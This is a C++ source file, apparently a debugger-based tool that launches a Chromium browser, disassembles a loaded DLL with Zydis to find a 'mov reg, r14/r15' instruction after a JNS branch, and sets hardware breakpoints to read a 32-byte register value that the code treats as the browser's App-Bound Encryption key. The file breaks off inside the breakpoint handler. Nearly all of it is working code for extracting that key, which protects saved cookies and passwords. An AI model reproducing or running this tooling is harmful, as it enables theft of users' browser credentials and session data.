#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <Zydis/Zydis.h>
#include <iostream>
#include <string>
#include <optional>
#include <cstdint>
#include <cstring>
#include <vector>
#include <array>
#include <unordered_map>
#include <tlhelp32.h>
#include <filesystem>
#include "Utils.hpp"

#define DEBUG_LOOP_TIMEOUT 90000
#define APPBOUND_KEY_SIZE 32

namespace fs = std::filesystem;

static constexpr DWORD64 EFLAGS_TF = 1ull << 8;   // Trap Flag
static constexpr DWORD64 EFLAGS_RF = 1ull << 16;  // Resume Flag

bool ReadThreadContext(HANDLE hThread, CONTEXT& ctx)
{
	if (!hThread)
		return false;

	ctx = { 0 };
	ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_DEBUG_REGISTERS;

	BOOL ok = GetThreadContext(hThread, &ctx);

	//CloseHandle(hThread);
	return ok == TRUE;
}

bool WriteThreadContext(HANDLE hThread, CONTEXT& ctx)
{
	if (!hThread)
		return false;

	BOOL ok = SetThreadContext(hThread, &ctx);

	//CloseHandle(hThread);
	return ok == TRUE;
}

struct BreakpointInformation
{
	uintptr_t address;
	HANDLE hThread;
	DWORD tid;
};

struct DebugModuleInfo
{
	uintptr_t base;
	SIZE_T size;
	std::unordered_map<DWORD, BreakpointInformation> breakpoints;
};

struct PESection
{
	uintptr_t Address;   // Runtime memory address: base + RVA
	DWORD Rva;           // Offset from module base
	DWORD Size;          // Virtual size in memory
	const char* Name;
};

struct MemoryMatch
{
	uintptr_t Address;          // Absolute memory address of the match
	DWORD OffsetInSection;      // Offset from section start
};

struct XrefInfo
{
	uintptr_t InstructionAddress;   // Runtime VA in debuggee process
	DWORD InstructionRva;           // Offset from module base, useful in IDA/Ghidra
	DWORD OffsetInText;             // Offset from .text section start
	uintptr_t ReferencedAddress;    // Runtime VA of referenced target
	char InstructionText[256];
};

struct KeyMovInsnResult
{
	void* movInstruction;        // remote address of: mov <reg>, r14/r15
	SIZE_T movInstructionSize;

	ZydisRegister movDstReg;
	ZydisRegister movSrcReg;     // R14 or R15
};

struct SimpleOperand
{
	ZydisOperandType type;
	ZydisOperandActions actions;
	ZydisRegister reg;

	bool isSrc;
	bool isDst;
};

struct SimpleInstruction
{
	ZydisMnemonic mnemonic;
	uint8_t length;
	uint8_t operandCount;

	SimpleOperand operands[ZYDIS_MAX_OPERAND_COUNT];
};

bool DecodeRemoteInstruction(
	HANDLE hProcess,
	void* remoteAddress,
	SimpleInstruction* out
)
{
	if (!hProcess || !remoteAddress || !out)
		return false;

	*out = {};

	uint8_t bytes[ZYDIS_MAX_INSTRUCTION_LENGTH] = {};
	SIZE_T bytesRead = 0;

	if (!ReadProcessMemory(
		hProcess,
		remoteAddress,
		bytes,
		sizeof(bytes),
		&bytesRead
	))
	{
		return false;
	}

	ZydisDecoder decoder;

	if (!ZYAN_SUCCESS(ZydisDecoderInit(
		&decoder,
		ZYDIS_MACHINE_MODE_LONG_64,
		ZYDIS_STACK_WIDTH_64
	)))
	{
		return false;
	}

	ZydisDecodedInstruction instruction = {};
	ZydisDecodedOperand operands[ZYDIS_MAX_OPERAND_COUNT] = {};

	if (!ZYAN_SUCCESS(ZydisDecoderDecodeFull(
		&decoder,
		bytes,
		bytesRead,
		&instruction,
		operands
	)))
	{
		return false;
	}

	out->mnemonic = instruction.mnemonic;
	out->length = instruction.length;
	out->operandCount = instruction.operand_count_visible;

	for (uint8_t i = 0; i < instruction.operand_count_visible; i++)
	{
		out->operands[i].type = operands[i].type;
		out->operands[i].actions = operands[i].actions;

		out->operands[i].isSrc =
			(operands[i].actions & ZYDIS_OPERAND_ACTION_READ) != 0;

		out->operands[i].isDst =
			(operands[i].actions & ZYDIS_OPERAND_ACTION_WRITE) != 0;

		if (operands[i].type == ZYDIS_OPERAND_TYPE_REGISTER)
			out->operands[i].reg = operands[i].reg.value;
		else
			out->operands[i].reg = ZYDIS_REGISTER_NONE;
	}

	return true;
}

static bool IsMovRegFromR14OrR15(
	const ZydisDecodedInstruction& instruction,
	const ZydisDecodedOperand* operands
)
{
	if (instruction.mnemonic != ZYDIS_MNEMONIC_MOV)
		return false;

	if (instruction.operand_count < 2)
		return false;

	if (operands[0].type != ZYDIS_OPERAND_TYPE_REGISTER)
		return false;

	if (operands[1].type != ZYDIS_OPERAND_TYPE_REGISTER)
		return false;

	ZydisRegister src = operands[1].reg.value;

	if (src != ZYDIS_REGISTER_R14 && src != ZYDIS_REGISTER_R15)
		return false;

	return true;
}

static bool IsAddressInsideRange(
	uintptr_t address,
	uintptr_t base,
	SIZE_T size
)
{
	if (!base || !size)
		return false;

	const uintptr_t end = base + size;

	if (end <= base)
		return false;

	return address >= base && address < end;
}


bool FindChromiumMovKeyInstruction(
	const PESection& textSection,
	void* mappedTargetInstruction,
	KeyMovInsnResult* result,
	SIZE_T maxInstructionsUntilJns = 64,
	SIZE_T maxInstructionsInJnsTarget = 64
)
{
	if (!result)
		return false;

	*result = {};

	if (!textSection.Address || !textSection.Size || !mappedTargetInstruction)
		return false;

	const uintptr_t textBase = textSection.Address;
	const SIZE_T textSize = static_cast<SIZE_T>(textSection.Size);
	const uintptr_t textEnd = textBase + textSize;
	const uintptr_t target = reinterpret_cast<uintptr_t>(mappedTargetInstruction);

	if (textEnd <= textBase)
		return false;

	if (!IsAddressInsideRange(target, textBase, textSize))
		return false;

	const auto* text = reinterpret_cast<const uint8_t*>(textBase);
	SIZE_T offset = static_cast<SIZE_T>(target - textBase);

	ZydisDecoder decoder = {};

	if (!ZYAN_SUCCESS(ZydisDecoderInit(
		&decoder,
		ZYDIS_MACHINE_MODE_LONG_64,
		ZYDIS_STACK_WIDTH_64)))
	{
		return false;
	}

	bool foundJns = false;
	SIZE_T jnsTargetOffset = 0;

	for (SIZE_T decoded = 0;
		offset < textSize && decoded < maxInstructionsUntilJns;
		++decoded)
	{
		ZydisDecodedInstruction instruction = {};
		ZydisDecodedOperand operands[ZYDIS_MAX_OPERAND_COUNT] = {};

		const ZyanStatus status = ZydisDecoderDecodeFull(
			&decoder,
			text + offset,
			textSize - offset,
			&instruction,
			operands
		);

		if (!ZYAN_SUCCESS(status))
			return false;

		if (instruction.length == 0)
			return false;

		const uintptr_t instructionAddress = textBase + offset;

		if (instruction.mnemonic == ZYDIS_MNEMONIC_JNS)
		{
			if (instruction.operand_count < 1)
				return false;

			const ZydisDecodedOperand& branchOperand = operands[0];

			if (branchOperand.type != ZYDIS_OPERAND_TYPE_IMMEDIATE)
				return false;

			if (!branchOperand.imm.is_relative)
				return false;

			ZyanU64 absoluteTarget = 0;

			if (!ZYAN_SUCCESS(ZydisCalcAbsoluteAddress(
				&instruction,
				&branchOperand,
				static_cast<ZyanU64>(instructionAddress),
				&absoluteTarget)))
			{
				return false;
			}

			const uintptr_t jnsTarget = static_cast<uintptr_t>(absoluteTarget);

			if (!IsAddressInsideRange(jnsTarget, textBase, textSize))
				return false;

			jnsTargetOffset = static_cast<SIZE_T>(jnsTarget - textBase);
			foundJns = true;
			break;
		}

		offset += instruction.length;
	}

	if (!foundJns)
		return false;

	offset = jnsTargetOffset;

	for (SIZE_T decoded = 0;
		offset < textSize && decoded < maxInstructionsInJnsTarget;
		++decoded)
	{
		ZydisDecodedInstruction instruction = {};
		ZydisDecodedOperand operands[ZYDIS_MAX_OPERAND_COUNT] = {};

		const ZyanStatus status = ZydisDecoderDecodeFull(
			&decoder,
			text + offset,
			textSize - offset,
			&instruction,
			operands
		);

		if (!ZYAN_SUCCESS(status))
			return false;

		if (instruction.length == 0)
			return false;

		if (IsMovRegFromR14OrR15(instruction, operands))
		{
			result->movInstruction = reinterpret_cast<void*>(textBase + offset);
			result->movInstructionSize = instruction.length;
			result->movDstReg = operands[0].reg.value;
			result->movSrcReg = operands[1].reg.value;

			return true;
		}

		offset += instruction.length;
	}

	return false;
}

bool SetReadBreakpoint(HANDLE hThread, void* address)
{
	CONTEXT ctx = {};
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

	if (!GetThreadContext(hThread, &ctx))
		return false;

	ctx.Dr0 = reinterpret_cast<DWORD64>(address);

	// Enable DR0 local breakpoint.
	ctx.Dr7 |= 1ull << 0;

	// Clear DR0 control bits: bits 16-19.
	ctx.Dr7 &= ~(0xFull << 16);

	/*
		RW = 11b -> data read/write
		LEN = 00b -> 1 byte
	*/
	DWORD64 rw = 0b11;
	DWORD64 len = 0b00;

	ctx.Dr7 |= ((rw | (len << 2)) << 16);

	ctx.Dr6 = 0;

	return SetThreadContext(hThread, &ctx);
}

static bool ReadRemoteSection(
	HANDLE hProcess,
	const PESection& section,
	std::vector<uint8_t>& outBytes
)
{
	outBytes.clear();

	if (!hProcess || hProcess == INVALID_HANDLE_VALUE)
		return false;

	if (!section.Address || !section.Size)
		return false;

	outBytes.resize(section.Size);

	SIZE_T bytesRead = 0;

	if (!ReadProcessMemory(
		hProcess,
		reinterpret_cast<LPCVOID>(section.Address),
		outBytes.data(),
		outBytes.size(),
		&bytesRead
	))
	{
		outBytes.clear();
		return false;
	}

	if (bytesRead != outBytes.size())
	{
		outBytes.resize(bytesRead);
	}

	return !outBytes.empty();
}

bool GetRemoteModuleSize(
	HANDLE hProcess,
	void* remoteModuleBase,
	SIZE_T* outSize
)
{
	if (!hProcess || !remoteModuleBase || !outSize)
		return false;

	*outSize = 0;

	SIZE_T read = 0;

	IMAGE_DOS_HEADER dos = {};

	if (!ReadProcessMemory(
		hProcess,
		remoteModuleBase,
		&dos,
		sizeof(dos),
		&read
	) || read != sizeof(dos))
	{
		return false;
	}

	if (dos.e_magic != IMAGE_DOS_SIGNATURE) // "MZ"
		return false;

	uintptr_t ntHeadersAddress =
		reinterpret_cast<uintptr_t>(remoteModuleBase) + dos.e_lfanew;

	DWORD ntSignature = 0;

	if (!ReadProcessMemory(
		hProcess,
		reinterpret_cast<void*>(ntHeadersAddress),
		&ntSignature,
		sizeof(ntSignature),
		&read
	) || read != sizeof(ntSignature))
	{
		return false;
	}

	if (ntSignature != IMAGE_NT_SIGNATURE) // "PE\0\0"
		return false;

	IMAGE_FILE_HEADER fileHeader = {};

	if (!ReadProcessMemory(
		hProcess,
		reinterpret_cast<void*>(ntHeadersAddress + sizeof(DWORD)),
		&fileHeader,
		sizeof(fileHeader),
		&read
	) || read != sizeof(fileHeader))
	{
		return false;
	}

	uintptr_t optionalHeaderAddress =
		ntHeadersAddress + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER);

	WORD optionalMagic = 0;

	if (!ReadProcessMemory(
		hProcess,
		reinterpret_cast<void*>(optionalHeaderAddress),
		&optionalMagic,
		sizeof(optionalMagic),
		&read
	) || read != sizeof(optionalMagic))
	{
		return false;
	}

	if (optionalMagic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
	{
		IMAGE_OPTIONAL_HEADER64 optional = {};

		if (!ReadProcessMemory(
			hProcess,
			reinterpret_cast<void*>(optionalHeaderAddress),
			&optional,
			sizeof(optional),
			&read
		))
		{
			return false;
		}

		*outSize = static_cast<SIZE_T>(optional.SizeOfImage);
		return true;
	}

	if (optionalMagic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
	{
		IMAGE_OPTIONAL_HEADER32 optional = {};

		if (!ReadProcessMemory(
			hProcess,
			reinterpret_cast<void*>(optionalHeaderAddress),
			&optional,
			sizeof(optional),
			&read
		))
		{
			return false;
		}

		*outSize = static_cast<SIZE_T>(optional.SizeOfImage);
		return true;
	}

	return false;
}

static bool TryResolveLikelyXrefTargetFast(
	const ZydisDecodedInstruction& instruction,
	const ZydisDecodedOperand& operand,
	uintptr_t instructionAddress,
	uintptr_t& outAddress
)
{
	outAddress = 0;

	if (operand.type == ZYDIS_OPERAND_TYPE_MEMORY)
	{
		// Most x64 static data references are RIP-relative:
		// lea reg, [rip + disp32]
		// mov reg, [rip + disp32]
		if (operand.mem.base != ZYDIS_REGISTER_RIP)
			return false;

		const uintptr_t nextRip = instructionAddress + instruction.length;

		outAddress = static_cast<uintptr_t>(
			static_cast<int64_t>(nextRip) +
			static_cast<int64_t>(operand.mem.disp.value)
			);

		return true;
	}

	if (operand.type == ZYDIS_OPERAND_TYPE_IMMEDIATE)
	{
		if (!operand.imm.is_relative)
			return false;

		ZyanU64 absoluteAddress = 0;

		if (!ZYAN_SUCCESS(ZydisCalcAbsoluteAddress(
			&instruction,
			&operand,
			static_cast<ZyanU64>(instructionAddress),
			&absoluteAddress)))
		{
			return false;
		}

		outAddress = static_cast<uintptr_t>(absoluteAddress);
		return true;
	}

	return false;
}

bool FindRemoteXrefsToAddressInTextFast(
	HANDLE hProcess,
	const PESection& textSection,
	uintptr_t targetAddress,
	std::vector<XrefInfo>& outXrefs,
	bool formatInstruction = false
)
{
	outXrefs.clear();

	if (!hProcess || hProcess == INVALID_HANDLE_VALUE)
		return false;

	if (!textSection.Address || !textSection.Size)
		return false;

	if (!targetAddress)
		return false;

	std::vector<uint8_t> textBytes;

	if (!ReadRemoteSection(hProcess, textSection, textBytes))
		return false;

	if (textBytes.empty())
		return false;

	ZydisDecoder decoder = {};

	if (!ZYAN_SUCCESS(ZydisDecoderInit(
		&decoder,
		ZYDIS_MACHINE_MODE_LONG_64,
		ZYDIS_STACK_WIDTH_64)))
	{
		return false;
	}

	ZydisFormatter formatter = {};
	bool formatterReady = false;

	if (formatInstruction)
	{
		formatterReady = ZYAN_SUCCESS(ZydisFormatterInit(
			&formatter,
			ZYDIS_FORMATTER_STYLE_INTEL
		));
	}

	outXrefs.reserve(16);

	SIZE_T offset = 0;
	const SIZE_T textSize = textBytes.size();
	const uint8_t* text = textBytes.data();

	while (offset < textSize)
	{
		ZydisDecodedInstruction instruction;
		ZydisDecodedOperand operands[ZYDIS_MAX_OPERAND_COUNT];

		const ZyanStatus status = ZydisDecoderDecodeFull(
			&decoder,
			text + offset,
			textSize - offset,
			&instruction,
			operands
		);

		if (!ZYAN_SUCCESS(status))
		{
			++offset;
			continue;
		}

		if (instruction.length == 0)
		{
			++offset;
			continue;
		}

		const uintptr_t instructionAddress = textSection.Address + offset;

		const ZyanU8 operandCount = instruction.operand_count_visible;

		for (ZyanU8 i = 0; i < operandCount; ++i)
		{
			uintptr_t referencedAddress = 0;

			if (!TryResolveLikelyXrefTargetFast(
				instruction,
				operands[i],
				instructionAddress,
				referencedAddress))
			{
				continue;
			}

			if (referencedAddress != targetAddress)
				continue;

			XrefInfo xref = {};

			xref.InstructionAddress = instructionAddress;
			xref.InstructionRva = textSection.Rva + static_cast<DWORD>(offset);
			xref.OffsetInText = static_cast<DWORD>(offset);
			xref.ReferencedAddress = referencedAddress;

			if (formatInstruction && formatterReady)
			{
				ZydisFormatterFormatInstruction(
					&formatter,
					&instruction,
					operands,
					instruction.operand_count_visible,
					xref.InstructionText,
					sizeof(xref.InstructionText),
					static_cast<ZyanU64>(instructionAddress),
					nullptr
				);
			}
			else
			{
				xref.InstructionText[0] = '\0';
			}

			outXrefs.emplace_back(xref);
			break;
		}

		offset += instruction.length;
	}

	return !outXrefs.empty();
}

bool FindXrefInSection(
	const PESection& section,
	uintptr_t targetAddress,
	std::vector<XrefInfo>& outXrefs,
	bool formatInstruction = false
)
{
	std::cout << "[*] Searching for XREF of address " << std::hex << targetAddress << " in section: " << section.Name << "..." << std::endl;

	outXrefs.clear();

	if (!section.Address || !section.Size)
		return false;

	if (!targetAddress)
		return false;

	ZydisDecoder decoder = {};

	if (!ZYAN_SUCCESS(ZydisDecoderInit(
		&decoder,
		ZYDIS_MACHINE_MODE_LONG_64,
		ZYDIS_STACK_WIDTH_64)))
	{
		return false;
	}

	ZydisFormatter formatter = {};
	bool formatterReady = false;

	if (formatInstruction)
	{
		formatterReady = ZYAN_SUCCESS(ZydisFormatterInit(
			&formatter,
			ZYDIS_FORMATTER_STYLE_INTEL
		));
	}

	outXrefs.reserve(16);

	const auto* text = reinterpret_cast<const uint8_t*>(section.Address);
	const SIZE_T textSize = static_cast<SIZE_T>(section.Size);

	SIZE_T offset = 0;

	while (offset < textSize)
	{
		ZydisDecodedInstruction instruction = {};
		ZydisDecodedOperand operands[ZYDIS_MAX_OPERAND_COUNT] = {};

		const ZyanStatus status = ZydisDecoderDecodeFull(
			&decoder,
			text + offset,
			textSize - offset,
			&instruction,
			operands
		);

		if (!ZYAN_SUCCESS(status))
		{
			++offset;
			continue;
		}

		if (instruction.length == 0)
		{
			++offset;
			continue;
		}

		const uintptr_t instructionAddress =
			section.Address + offset;

		for (ZyanU8 i = 0; i < instruction.operand_count_visible; ++i)
		{
			uintptr_t referencedAddress = 0;

			if (!TryResolveLikelyXrefTargetFast(
				instruction,
				operands[i],
				instructionAddress,
				referencedAddress))
			{
				continue;
			}

			if (referencedAddress != targetAddress)
				continue;

			XrefInfo xref = {};

			xref.InstructionAddress = instructionAddress;
			xref.InstructionRva = section.Rva + static_cast<DWORD>(offset);
			xref.OffsetInText = static_cast<DWORD>(offset);
			xref.ReferencedAddress = referencedAddress;

			if (formatInstruction && formatterReady)
			{
				ZydisFormatterFormatInstruction(
					&formatter,
					&instruction,
					operands,
					instruction.operand_count_visible,
					xref.InstructionText,
					sizeof(xref.InstructionText),
					static_cast<ZyanU64>(instructionAddress),
					nullptr
				);
			}
			else
			{
				xref.InstructionText[0] = '\0';
			}

			outXrefs.emplace_back(xref);
			break;
		}

		offset += instruction.length;
	}

	return !outXrefs.empty();
}

static std::wstring StripWin32Prefix(std::wstring path)
{
	if (path.rfind(LR"(\\?\UNC\)", 0) == 0)
		return L"\\" + path.substr(8);

	if (path.rfind(LR"(\\?\)", 0) == 0)
		return path.substr(4);

	return path;
}

static std::wstring GetBaseName(const std::wstring& path)
{
	size_t pos = path.find_last_of(L"\\/");
	if (pos == std::wstring::npos)
		return path;

	return path.substr(pos + 1);
}

static std::wstring GetPathFromHandle(HANDLE hFile)
{
	if (!hFile || hFile == INVALID_HANDLE_VALUE)
		return L"";

	DWORD size = GetFinalPathNameByHandleW(
		hFile,
		nullptr,
		0,
		FILE_NAME_NORMALIZED | VOLUME_NAME_DOS
	);

	if (size == 0)
		return L"";

	std::wstring path(size, L'\0');

	DWORD written = GetFinalPathNameByHandleW(
		hFile,
		path.data(),
		size,
		FILE_NAME_NORMALIZED | VOLUME_NAME_DOS
	);

	if (written == 0)
		return L"";

	path.resize(written);
	return StripWin32Prefix(path);
}

static bool SetHardwareExecuteBreakpoint(HANDLE hThread, uintptr_t address, int slot)
{
	if (!hThread || hThread == INVALID_HANDLE_VALUE)
		return false;

	if (slot < 0 || slot > 3)
		return false;

	CONTEXT ctx = {};
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

	if (!GetThreadContext(hThread, &ctx))
		return false;

	switch (slot)
	{
	case 0:
		ctx.Dr0 = address;
		break;
	case 1:
		ctx.Dr1 = address;
		break;
	case 2:
		ctx.Dr2 = address;
		break;
	case 3:
		ctx.Dr3 = address;
		break;
	}

	const uint64_t enableBit = 1ull << (slot * 2);
	const uint64_t controlMask = 0xFull << (16 + slot * 4);

	ctx.Dr7 &= ~enableBit;
	ctx.Dr7 &= ~controlMask;

	ctx.Dr7 |= enableBit; // local enable
	ctx.Dr6 = 0;

	return SetThreadContext(hThread, &ctx);
}

struct DebugArgs
{
public:
	std::wstring target;
	std::vector<uint8_t> result;
	uintptr_t breakpointOffset;
	std::wstring targetDll;
};

struct MappedImageView
{
	HANDLE File = INVALID_HANDLE_VALUE;
	HANDLE Mapping = nullptr;
	void* Base = nullptr;

	uint64_t FileSize = 0;        // Physical DLL size on disk
	DWORD SizeOfImage = 0;        // Loaded image size from PE OptionalHeader.SizeOfImage
	DWORD SizeOfHeaders = 0;
	DWORD EntryPointRva = 0;
	uintptr_t PreferredImageBase = 0;

	bool Is64 = false;

	~MappedImageView()
	{
		Close();
	}

	MappedImageView() = default;

	MappedImageView(const MappedImageView&) = delete;
	MappedImageView& operator=(const MappedImageView&) = delete;

	void Close()
	{
		if (Base)
		{
			UnmapViewOfFile(Base);
			Base = nullptr;
		}

		if (Mapping)
		{
			CloseHandle(Mapping);
			Mapping = nullptr;
		}

		if (File && File != INVALID_HANDLE_VALUE)
		{
			CloseHandle(File);
			File = INVALID_HANDLE_VALUE;
		}

		FileSize = 0;
		SizeOfImage = 0;
		SizeOfHeaders = 0;
		EntryPointRva = 0;
		PreferredImageBase = 0;
		Is64 = false;
	}
};

bool MapImage(
	fs::path path,
	MappedImageView& out
)
{
	std::wcout << L"[*] Mapping image to memory: " << path.wstring() << std::endl;

	out.Close();

	if (path.empty() || !fs::exists(path))
		return false;

	out.File = CreateFileW(
		path.wstring().c_str(),
		GENERIC_READ,
		FILE_SHARE_READ | FILE_SHARE_DELETE,
		nullptr,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		nullptr
	);

	if (out.File == INVALID_HANDLE_VALUE)
		return false;

	LARGE_INTEGER fileSize = {};

	if (!GetFileSizeEx(out.File, &fileSize) || fileSize.QuadPart <= 0)
	{
		out.Close();
		return false;
	}

	out.FileSize = static_cast<uint64_t>(fileSize.QuadPart);

	out.Mapping = CreateFileMappingW(
		out.File,
		nullptr,
		PAGE_READONLY | SEC_IMAGE,
		0,
		0,
		nullptr
	);

	if (!out.Mapping)
	{
		out.Close();
		return false;
	}

	out.Base = MapViewOfFile(
		out.Mapping,
		FILE_MAP_READ,
		0,
		0,
		0
	);

	if (!out.Base)
	{
		out.Close();
		return false;
	}

	auto* base = static_cast<uint8_t*>(out.Base);

	auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);

	if (dos->e_magic != IMAGE_DOS_SIGNATURE)
	{
		out.Close();
		return false;
	}

	if (dos->e_lfanew <= 0)
	{
		out.Close();
		return false;
	}

	auto* nt32 = reinterpret_cast<IMAGE_NT_HEADERS32*>(base + dos->e_lfanew);

	if (nt32->Signature != IMAGE_NT_SIGNATURE)
	{
		out.Close();
		return false;
	}

	if (nt32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
	{
		auto* nt64 = reinterpret_cast<IMAGE_NT_HEADERS64*>(base + dos->e_lfanew);

		out.Is64 = true;
		out.SizeOfImage = nt64->OptionalHeader.SizeOfImage;
		out.SizeOfHeaders = nt64->OptionalHeader.SizeOfHeaders;
		out.EntryPointRva = nt64->OptionalHeader.AddressOfEntryPoint;
		out.PreferredImageBase = static_cast<uintptr_t>(nt64->OptionalHeader.ImageBase);

		return true;
	}

	if (nt32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
	{
		out.Is64 = false;
		out.SizeOfImage = nt32->OptionalHeader.SizeOfImage;
		out.SizeOfHeaders = nt32->OptionalHeader.SizeOfHeaders;
		out.EntryPointRva = nt32->OptionalHeader.AddressOfEntryPoint;
		out.PreferredImageBase = static_cast<uintptr_t>(nt32->OptionalHeader.ImageBase);

		return true;
	}

	out.Close();
	return false;
}

bool FindBytesInSection(
	const PESection& section,
	const char* needle,
	MemoryMatch& out
)
{
	std::cout << "[*] Searching for bytes " << "\"" << needle << "\""  << " in section: " << section.Name << std::endl;

	out = {};

	if (!section.Address || !section.Size || !needle || !needle[0])
		return false;

	const auto* sectionBase = reinterpret_cast<const uint8_t*>(section.Address);
	const auto* pattern = reinterpret_cast<const uint8_t*>(needle);

	SIZE_T sectionSize = static_cast<SIZE_T>(section.Size);
	SIZE_T patternSize = strlen(needle);

	if (patternSize == 0 || patternSize > sectionSize)
		return false;

	const uint8_t firstByte = pattern[0];

	SIZE_T offset = 0;

	while (offset <= sectionSize - patternSize)
	{
		const void* found = memchr(
			sectionBase + offset,
			firstByte,
			sectionSize - offset - patternSize + 1
		);

		if (!found)
			return false;

		const auto* candidate = static_cast<const uint8_t*>(found);
		const SIZE_T candidateOffset = static_cast<SIZE_T>(candidate - sectionBase);

		if (memcmp(candidate, pattern, patternSize) == 0)
		{
			out.Address = reinterpret_cast<uintptr_t>(candidate);
			out.OffsetInSection = static_cast<DWORD>(candidateOffset);
			return true;
		}

		offset = candidateOffset + 1;
	}

	return false;
}

bool GetPESection(
	void* imageBase,
	const char* sectionName,
	PESection& out
)
{
	std::cout << "[*] Searching for section: " << sectionName << std::endl;

	out = {};

	if (!imageBase || !sectionName || !sectionName[0])
		return false;

	auto* base = reinterpret_cast<uint8_t*>(imageBase);

	auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);

	if (dos->e_magic != IMAGE_DOS_SIGNATURE)
		return false;

	if (dos->e_lfanew <= 0)
		return false;

	auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(
		base + static_cast<size_t>(dos->e_lfanew)
		);

	if (nt->Signature != IMAGE_NT_SIGNATURE)
		return false;

	if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
		return false;

	if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
		return false;

	auto* section = IMAGE_FIRST_SECTION(nt);

	for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i)
	{
		char name[IMAGE_SIZEOF_SHORT_NAME + 1] = {};
		memcpy(name, section[i].Name, IMAGE_SIZEOF_SHORT_NAME);

		if (_stricmp(name, sectionName) != 0)
			continue;

		DWORD size = section[i].Misc.VirtualSize;

		if (size == 0)
			size = section[i].SizeOfRawData;

		out.Rva = section[i].VirtualAddress;
		out.Address = reinterpret_cast<uintptr_t>(base + section[i].VirtualAddress);
		out.Size = size;
		out.Name = sectionName;

		return true;
	}

	return false;
}

static DWORD WINAPI DebugLoop(LPVOID param)
{
	DebugArgs* args = (DebugArgs*)param;
	DEBUG_EVENT de = {};

	STARTUPINFOW si = {};
	PROCESS_INFORMATION pi = {};

	si.cb = sizeof(si);

	DWORD flags =
		DEBUG_ONLY_THIS_PROCESS |   // debug only this process, not children
		CREATE_NEW_CONSOLE;
	
	if (!CreateProcessW(
		nullptr,
		args->target.data(),
		nullptr,
		nullptr,
		FALSE,
		flags,
		nullptr,
		nullptr,
		&si,
		&pi
	))
	{
		return 2;
	}

	bool shouldExitDebugger = false;
	DebugModuleInfo targetDll = { 0 };
	uintptr_t targetBpAddress = 0;
	ZydisRegister srcRegister = ZYDIS_REGISTER_NONE;
	DWORD steppingThreadId = NULL;

	while (!shouldExitDebugger)
	{
		if (!WaitForDebugEvent(&de, INFINITE))
			break;

		DWORD continueStatus = DBG_EXCEPTION_NOT_HANDLED;

		switch (de.dwDebugEventCode)
		{
		case CREATE_PROCESS_DEBUG_EVENT:
		{
			if (de.u.CreateProcessInfo.hFile)
				CloseHandle(de.u.CreateProcessInfo.hFile);

			continueStatus = DBG_CONTINUE;
			break;
		}

		case CREATE_THREAD_DEBUG_EVENT:
		{
			HANDLE hThread = de.u.CreateThread.hThread;
			uintptr_t threadStartAddress =
				reinterpret_cast<uintptr_t>(de.u.CreateThread.lpStartAddress);

			if (targetDll.base < threadStartAddress &&
				(targetDll.base + targetDll.size) > threadStartAddress)
			{
				if (targetBpAddress)
				{
					BreakpointInformation bp = { 0 };
					bp.hThread = hThread;
					bp.tid = de.dwThreadId;
					bp.address = targetBpAddress;

					bool ok = SetHardwareExecuteBreakpoint(hThread, bp.address, 0);

					if (ok) {
						targetDll.breakpoints[bp.tid] = bp;
					}
				}
			}

			continueStatus = DBG_CONTINUE;
			break;
		}

		case LOAD_DLL_DEBUG_EVENT:
		{
			HANDLE hFile = de.u.LoadDll.hFile;
			void* moduleBase = de.u.LoadDll.lpBaseOfDll;

			std::wstring dllPath = GetPathFromHandle(hFile);
			std::wstring dllName = GetBaseName(dllPath);

			if (_wcsicmp(dllName.c_str(), args->targetDll.c_str()) == 0)
			{
				PESection rdata = {};
				PESection text = {};
				SIZE_T modSize = 0;
				if (GetRemoteModuleSize(pi.hProcess, moduleBase, &modSize))
				{
					targetDll.base = reinterpret_cast<uintptr_t>(moduleBase);
					targetDll.size = modSize;
					
					SimpleInstruction insn;
					LPVOID bpAddress = reinterpret_cast<LPVOID>(targetDll.base + args->breakpointOffset);
					if (DecodeRemoteInstruction(pi.hProcess, bpAddress, &insn)) { // just to make sure the instruction matches, if you want, you can skip
						if (insn.mnemonic == ZYDIS_MNEMONIC_MOV &&
							insn.operandCount == 2 &&
							insn.operands[1].isSrc &&
							(insn.operands[1].reg == ZYDIS_REGISTER_R14 || insn.operands[1].reg == ZYDIS_REGISTER_R15)) {
							targetBpAddress = reinterpret_cast<uintptr_t>(bpAddress);
							srcRegister = insn.operands[1].reg;
							continueStatus = DBG_CONTINUE;
							break;
						}
					}
					
					continueStatus = DBG_EXCEPTION_NOT_HANDLED;
				}
			}

			if (hFile)
				CloseHandle(hFile);

			continueStatus = DBG_CONTINUE;
			break;
		}

		case EXCEPTION_DEBUG_EVENT:
		{
			const uintptr_t excp_addr = reinterpret_cast<uintptr_t>(de.u.Exception.ExceptionRecord.ExceptionAddress);
			const EXCEPTION_DEBUG_INFO& ex = de.u.Exception;
			const DWORD code = ex.ExceptionRecord.ExceptionCode;
			const auto& breakpoints = targetDll.breakpoints;

			if (code == EXCEPTION_SINGLE_STEP)
			{
				auto it = breakpoints.find(de.dwThreadId);
				if (it != breakpoints.end())
				{
					auto& bp = it->second;
					CONTEXT ctx = { 0 };
					if (!ReadThreadContext(bp.hThread, ctx))
					{
						continueStatus = DBG_EXCEPTION_NOT_HANDLED;
						break;
					}

					bool hitHardwareBp =
						(ctx.Dr6 & 0x1) ||
						(ctx.Dr6 & 0x2) ||
						(ctx.Dr6 & 0x4) ||
						(ctx.Dr6 & 0x8);

					bool hitTrapFlag =
						(ctx.Dr6 & (1ull << 14)) != 0;

					if (hitHardwareBp)
					{
						LPVOID p_addr = NULL;
						switch (srcRegister)
						{
						case ZYDIS_REGISTER_R14:
						{
							p_addr = reinterpret_cast<LPVOID>(ctx.R14);
							break;
